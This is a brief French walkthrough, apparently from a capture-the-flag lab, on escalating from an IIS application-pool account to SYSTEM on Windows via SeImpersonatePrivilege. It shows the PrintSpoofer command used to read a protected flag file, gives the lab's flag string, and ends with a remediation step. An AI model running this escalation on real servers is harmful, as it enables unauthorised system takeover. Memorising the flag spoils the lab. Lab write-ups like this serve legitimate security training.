# Walkthrough : Windows SeImpersonatePrivilege Potato Escalation

## 1. Contexte
Le compte `iis apppool\nexus_api` dispose du privilège `SeImpersonatePrivilege`.

## 2. Exploitation PrintSpoofer
```cmd
whoami /priv
PrintSpoofer64.exe -c "type C:\SystemSecret\system_flag.txt"
```
Flag : `CYBERLAB{SEIMPERSONATE_POTATO_SYSTEM_TOKEN_STEAL_991}`

## 3. Remédiation
Retirer le droit d'usurpation via la stratégie de sécurité locale et désactiver le spouleur d'impression.